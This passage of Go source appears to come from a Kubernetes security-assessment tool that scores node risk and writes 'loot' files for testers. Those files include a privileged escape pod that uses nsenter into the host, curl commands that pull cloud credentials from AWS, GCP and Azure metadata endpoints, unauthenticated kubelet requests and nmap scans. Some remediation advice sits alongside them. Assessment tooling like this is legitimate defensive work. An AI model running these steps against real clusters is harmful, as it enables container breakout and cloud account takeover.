	// Check for cloud provider external exposure
	cloudProvider := k8sinternal.DetectCloudProviderFromNode(node.Spec.ProviderID)
	if cloudProvider == "AWS" || cloudProvider == "GCP" || cloudProvider == "Azure" {
		// In cloud environments, external IPs often indicate internet-facing nodes
		if analysis.IsExternallyExposed {
			analysis.RiskLevel = "HIGH"
			analysis.SecurityIssues = append(analysis.SecurityIssues,
				"Cloud node with external IP - potential attack surface for SSH, RDP, kubelet port 10250")
		}
	}

	return analysis
}

// buildAttackPaths generates attack path visualizations
func buildAttackPaths(finding NodeFinding, kubelet KubeletSecurityAnalysis, privileged PrivilegedWorkloadAnalysis, imds IMDSRiskAnalysis) []string {
	var paths []string

	// Path 1: Privileged pod escape
	if privileged.PrivilegedPods > 0 {
		paths = append(paths,
			fmt.Sprintf("Pod Escape: Privileged Pod (%s) → Container Breakout → Node Root Shell → Host Filesystem Access",
				strings.Join(privileged.PrivilegedPodNames, ", ")))
	}

	// Path 2: Kubelet exploitation
	if kubelet.AnonymousAuth && finding.IsExternallyExposed {
		paths = append(paths,
			fmt.Sprintf("Node Takeover: Internet → Kubelet Port 10250 → Unauthenticated RCE → Node Root → etcd Access → Cluster Secrets"))
	} else if kubelet.AnonymousAuth {
		paths = append(paths,
			fmt.Sprintf("Node Takeover: Compromised Pod → Kubelet Port 10250 → RCE → Node Root → Cluster Admin"))
	}

	// Path 3: IMDS to cloud breakout
	if imds.RiskLevel == "CRITICAL" {
		paths = append(paths,
			fmt.Sprintf("Cloud Breakout: Any Pod → IMDS (%s) → %s Credentials → Cloud API → Full Account Compromise",
				imds.MetadataEndpoint, imds.CloudProvider))
	}

	// Path 4: HostPath escape
	if len(privileged.DangerousHostPaths) > 0 {
		paths = append(paths,
			fmt.Sprintf("Host Filesystem Access: Pod with hostPath → Mount / or /etc → Read /etc/shadow → Node Takeover"))
	}

	// Path 5: HostNetwork lateral movement
	if privileged.HostNetworkPods > 0 {
		paths = append(paths,
			fmt.Sprintf("Lateral Movement: hostNetwork Pod → Node Network Namespace → Other Nodes → Data Exfiltration"))
	}

	// Path 6: Resource exhaustion DoS
	if finding.ResourcePressure == "CRITICAL" {
		paths = append(paths,
			fmt.Sprintf("DoS: Resource Pressure → Deploy Fork Bomb Pod → Exhaust PIDs → Node Crash → Cluster Instability"))
	}

	return paths
}

// calculateNodeRiskLevel determines overall risk level for the node
func calculateNodeRiskLevel(
	finding NodeFinding,
	kubelet KubeletSecurityAnalysis,
	resource ResourceAnalysis,
	privileged PrivilegedWorkloadAnalysis,
	imds IMDSRiskAnalysis,
	network struct {
		IsExternallyExposed bool
		RiskLevel           string
		SecurityIssues      []string
	},
) string {
	riskScore := 0

	// CRITICAL FACTORS (50+ points)
	if kubelet.AnonymousAuth && network.IsExternallyExposed {
		riskScore += 100 // Exposed kubelet with anonymous auth = RCE from internet
	}
	if privileged.PrivilegedPods > 0 && network.IsExternallyExposed {
		riskScore += 90 // Privileged pods on internet-facing node
	}
	if imds.RiskLevel == "CRITICAL" {
		riskScore += 85 // Unrestricted IMDS = credential theft
	}
	if resource.ResourcePressure == "CRITICAL" {
		riskScore += 50 // PID pressure = fork bomb risk
	}

	// HIGH FACTORS (25-40 points)
	if kubelet.ReadOnlyPort > 0 {
		riskScore += 40 // Read-only port = secret exposure
	}
	if kubelet.AnonymousAuth {
		riskScore += 35 // Kubelet RCE from cluster
	}
	if privileged.PrivilegedPods > 0 {
		riskScore += 30 // Container escape risk
	}
	if len(finding.Vulnerabilities) > 0 {
		riskScore += 25 // Kernel/OS vulnerabilities
	}

	// MEDIUM FACTORS (10-20 points)
	if imds.RiskLevel == "HIGH" {
		riskScore += 20 // IMDS accessible
	}
	if len(privileged.DangerousHostPaths) > 0 {
		riskScore += 18 // Dangerous hostPath mounts
	}
	if privileged.HostNetworkPods > 0 {
		riskScore += 15 // Network namespace escape
	}
	if resource.ResourcePressure == "HIGH" {
		riskScore += 12 // Resource pressure
	}
	if network.IsExternallyExposed {
		riskScore += 10 // External IP
	}

	// Classify
	if riskScore >= 50 {
		return "CRITICAL"
	} else if riskScore >= 25 {
		return "HIGH"
	} else if riskScore >= 10 {
		return "MEDIUM"
	}
	return "LOW"
}

// generateTable creates the table output
func generateNodesTable(findings []NodeFinding) internal.TableFile {
	headers := []string{
		// Identity
		"Name", "Internal IP", "External IP",
		// Specs
		"OS/Kernel", "Runtime", "Kubelet Ver",
		// Capacity
		"Pods",
		// Security Flags
		"Kubelet Secure", "Privileged Pods", "Resource Pressure", "Externally Exposed",
		// Cloud
		"Cloud Provider", "Cloud SA/Role",
		// Status
		"Conditions", "Taints", "Labels",
	}

	var rows [][]string

	for _, f := range findings {
		// Kubelet security summary
		kubeletSecure := "Yes"
		if f.KubeletAnonymousAuth {
			kubeletSecure = "No (Anon Auth)"
		} else if f.KubeletReadOnlyPort > 0 {
			kubeletSecure = fmt.Sprintf("No (RO:%d)", f.KubeletReadOnlyPort)
		} else if len(f.KubeletSecurityIssues) > 0 {
			kubeletSecure = "No (Issues)"
		}

		// Privileged pods summary
		privilegedSummary := "-"
		if f.PrivilegedPods > 0 || f.HostNetworkPods > 0 || f.HostPIDPods > 0 {
			privilegedSummary = fmt.Sprintf("Priv:%d HostNet:%d HostPID:%d",
				f.PrivilegedPods, f.HostNetworkPods, f.HostPIDPods)
		}

		// OS/Kernel summary (no truncation)
		osKernel := fmt.Sprintf("%s / %s", f.OSImage, f.KernelVersion)

		// External exposure
		externallyExposed := "No"
		if f.IsExternallyExposed {
			externallyExposed = "Yes"
		}

		// Cloud SA/Role
		cloudSARole := "-"
		if f.CloudRole != "" {
			cloudSARole = f.CloudRole
		}

		// Labels (no truncation)
		labelsStr := formatNodeLabels(f.Labels)

		// Node conditions summary
		conditions := "Ready"
		if !f.IsReady {
			conditions = "Not Ready"
		}
		if f.HasDiskPressure {
			conditions += ", DiskPressure"
		}
		if f.HasMemoryPressure {
			conditions += ", MemoryPressure"
		}
		if f.HasPIDPressure {
			conditions += ", PIDPressure"
		}

		// Taints (no truncation)
		taintsStr := "-"
		if len(f.Taints) > 0 {
			taintsStr = strings.Join(f.Taints, "; ")
		}

		row := []string{
			f.Name,
			f.InternalIP,
			k8sinternal.NonEmpty(f.ExternalIP),
			osKernel,
			f.ContainerRuntime,
			f.KubeletVersion,
			fmt.Sprintf("%d/%d", f.CurrentPods, f.PodsAllocatable),
			kubeletSecure,
			privilegedSummary,
			f.ResourcePressure,
			externallyExposed,
			k8sinternal.NonEmpty(f.CloudProvider),
			cloudSARole,
			conditions,
			taintsStr,
			labelsStr,
		}
		rows = append(rows, row)
	}

	// Sort by name
	sort.SliceStable(rows, func(i, j int) bool {
		return rows[i][0] < rows[j][0]
	})

	return internal.TableFile{
		Name:   "Nodes",
		Header: headers,
		Body:   rows,
	}
}

// formatNodeLabels formats all node labels without truncation
func formatNodeLabels(labels map[string]string) string {
	if len(labels) == 0 {
		return "-"
	}
	var labelPairs []string
	for k, v := range labels {
		labelPairs = append(labelPairs, fmt.Sprintf("%s=%s", k, v))
	}
	sort.Strings(labelPairs)
	return strings.Join(labelPairs, ", ")
}

// generateNodesLootFiles creates all loot files using LootBuilder
func generateNodesLootFiles(findings []NodeFinding) *shared.LootBuilder {
	loot := shared.NewLootBuilder()

	// 1. Node-Enum - kubectl commands for enumeration
	generateNodeEnumLoot(findings, loot)

	// 2. Pod-YAMLs - pod manifests for node access
	generateNodesPodYAMLsLoot(findings, loot)

	// 3. Node-IMDS-Risk - cloud metadata exploit commands
	generateIMDSRiskLoot(findings, loot)

	// 4. NMAP-Nodes - reconnaissance commands
	generateNMAPLoot(findings, loot)

	return loot
}

func generateNodeEnumLoot(findings []NodeFinding, loot *shared.LootBuilder) {
	section := loot.Section("Node-Enum")

	section.SetHeader(`#####################################
##### Node Enumeration Commands
#####################################
`)

	if globals.KubeContext != "" {
		section.Addf("kubectl config use-context %s", globals.KubeContext).AddBlank()
	}

	section.Add("# List all nodes with security context")
	section.Add("kubectl get nodes -o wide")
	section.AddBlank()

	for _, f := range findings {
		section.Addf("# Node: %s (Risk: %s)", f.Name, f.RiskLevel)
		section.Addf("kubectl describe node %s", f.Name)
		section.Addf("kubectl get node %s -o json | jq '.status.conditions'", f.Name)
		section.AddBlank()

		if f.KubeletAnonymousAuth {
			section.Add("# WARNING: Kubelet anonymous auth enabled - RCE available")
			section.Addf("curl -k https://%s:10250/pods", f.InternalIP)
			section.AddBlank()
		}
	}
}

func generateNodesPodYAMLsLoot(findings []NodeFinding, loot *shared.LootBuilder) {
	section := loot.Section("Pod-YAMLs")

	section.SetHeader(`#####################################
##### Pod YAMLs for Node Access
#####################################
`)

	for _, f := range findings {
		// Build tolerations for the node's taints
		var tolerations []corev1.Toleration
		for _, taintStr := range f.Taints {
			parts := strings.Split(taintStr, ":")
			if len(parts) == 2 {
				keyValue := strings.Split(parts[0], "=")
				if len(keyValue) == 2 {
					tolerations = append(tolerations, corev1.Toleration{
						Key:      keyValue[0],
						Operator: corev1.TolerationOpEqual,
						Value:    keyValue[1],
						Effect:   corev1.TaintEffect(parts[1]),
					})
				}
			}
		}

		// Standard probe pod
		pod := corev1.Pod{
			TypeMeta: metav1.TypeMeta{
				APIVersion: "v1",
				Kind:       "Pod",
			},
			ObjectMeta: metav1.ObjectMeta{
				Name: fmt.Sprintf("probe-%s", f.Name),
			},
			Spec: corev1.PodSpec{
				NodeName:    f.Name,
				Tolerations: tolerations,
				Containers: []corev1.Container{
					{
						Name:    "alpine",
						Image:   "alpine:latest",
						Command: []string{"sh", "-c", "sleep 3600"},
					},
				},
			},
		}

		if yamlData, err := yaml.Marshal(pod); err == nil {
			section.Addf("# Standard Pod for Node: %s", f.Name)
			section.Add(string(yamlData))
			section.Add("---")
		}

		// If node has privileged pods, create a privileged escape pod
		if f.PrivilegedPods > 0 {
			privileged := true
			escapePod := corev1.Pod{
				TypeMeta: metav1.TypeMeta{
					APIVersion: "v1",
					Kind:       "Pod",
				},
				ObjectMeta: metav1.ObjectMeta{
					Name: fmt.Sprintf("escape-%s", f.Name),
				},
				Spec: corev1.PodSpec{
					NodeName:    f.Name,
					Tolerations: tolerations,
					HostNetwork: true,
					HostPID:     true,
					HostIPC:     true,
					Containers: []corev1.Container{
						{
							Name:    "escape",
							Image:   "alpine:latest",
							Command: []string{"sh", "-c", "nsenter -t 1 -m -u -n -i sh"},
							SecurityContext: &corev1.SecurityContext{
								Privileged: &privileged,
							},
							VolumeMounts: []corev1.VolumeMount{
								{
									Name:      "host-root",
									MountPath: "/host",
								},
							},
						},
					},
					Volumes: []corev1.Volume{
						{
							Name: "host-root",
							VolumeSource: corev1.VolumeSource{
								HostPath: &corev1.HostPathVolumeSource{
									Path: "/",
								},
							},
						},
					},
				},
			}

			if yamlData, err := yaml.Marshal(escapePod); err == nil {
				section.Addf("# Privileged Escape Pod for Node: %s (Container Breakout)", f.Name)
				section.Add(string(yamlData))
				section.Add("---")
			}
		}

		section.AddBlank()
	}
}

func generateIMDSRiskLoot(findings []NodeFinding, loot *shared.LootBuilder) {
	section := loot.Section("Node-IMDS-Risk")

	section.SetHeader(`═══════════════════════════════════════════════════════════════
         CLOUD METADATA (IMDS) ACCESS RISKS
═══════════════════════════════════════════════════════════════
`)

	hasRisk := false

	for _, f := range findings {
		if f.IMDSAccessRisk == "CRITICAL" || f.IMDSAccessRisk == "HIGH" {
			hasRisk = true

	section.Addf("Node: %s [%s]", f.Name, f.IMDSAccessRisk)
	section.Addf("  Cloud Provider: %s", f.CloudProvider)
	section.Addf("  Metadata Endpoint: %s", f.MetadataEndpoint)
	section.Addf("  IAM Role Attached: %t", f.IAMRoleAttached)
	section.AddBlank()

			if f.IMDSAccessRisk == "CRITICAL" {
	section.Add("  ⚠️  CRITICAL: No Network Policy Blocking IMDS")
	section.Add("  Impact: ALL pods can access cloud credentials")
	section.AddBlank()
			}

	section.Add("  Credential Theft Scenario:")
			switch f.CloudProvider {
			case "AWS":
	section.Add("    # From any pod:")
	section.Add("    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
	section.Add("    ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)")
	section.Add("    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
	section.Add("    # Extract AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN")
	section.Add("    # Use with aws cli to escalate to cloud admin")
			case "GCP":
	section.Add("    # From any pod:")
	section.Add("    curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
	section.Add("    # Extract access_token")
	section.Add("    # Use with gcloud to escalate privileges")
			case "Azure":
	section.Add("    # From any pod:")
	section.Add("    curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
	section.Add("    # Extract access_token")
	section.Add("    # Use with az cli to escalate privileges")
			}
	section.AddBlank()

	section.Add("  Remediation:")
	section.Add("    # Block IMDS access with NetworkPolicy:")
	section.Add("    apiVersion: networking.k8s.io/v1")
	section.Add("    kind: NetworkPolicy")
	section.Add("    metadata:")
	section.Add("      name: deny-metadata-access")
	section.Add("    spec:")
	section.Add("      podSelector: {}")
	section.Add("      policyTypes:")
	section.Add("      - Egress")
	section.Add("      egress:")
	section.Add("      - to:")
	section.Add("        - ipBlock:")
	section.Add("            cidr: 0.0.0.0/0")
	section.Add("            except:")
	section.Add("            - 169.254.169.254/32")
	section.AddBlank()

	section.Add("───────────────────────────────────────────────────────────────")
	section.AddBlank()
		}
	}

	if !hasRisk {
	section.Add("✓ No critical IMDS access risks detected")
	section.AddBlank()
	}

}

func generateNMAPLoot(findings []NodeFinding, loot *shared.LootBuilder) {
	section := loot.Section("NMAP-Nodes")

	section.SetHeader(`#####################################
##### NMAP Commands for Nodes
#####################################
`)

	for _, f := range findings {
		if f.IsExternallyExposed {
	section.Addf("# Node: %s (External IP: %s)", f.Name, f.ExternalIP)
	section.Add("# Full port scan")
	section.Addf("nmap -sV -p- %s", f.ExternalIP)
	section.AddBlank()
	section.Add("# Kubernetes-specific ports")
	section.Addf("nmap -sV -p 22,3389,6443,10250,10255,30000-32767 %s", f.ExternalIP)
	section.AddBlank()
		} else if f.InternalIP != "" {
	section.Addf("# Node: %s (Internal IP: %s)", f.Name, f.InternalIP)
	section.Add("# From within cluster:")
	section.Addf("nmap -sV -p 10250,10255 %s", f.InternalIP)
	section.AddBlank()
		}
	}

}

// Helper functions

func getNodeIP(node corev1.Node) string {
	for _, addr := range node.Status.Addresses {
		if addr.Type == corev1.NodeInternalIP {
			return addr.Address
		}
	}
	return ""
}

func isDangerousHostPath(path string) bool {
	dangerousPaths := []string{"/", "/etc", "/var", "/proc", "/sys", "/dev", "/host", "/run", "/boot"}
	for _, dangerous := range dangerousPaths {
		if path == dangerous || strings.HasPrefix(path, dangerous+"/") {
			return true
		}
	}
	return false
}

func nodesContains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
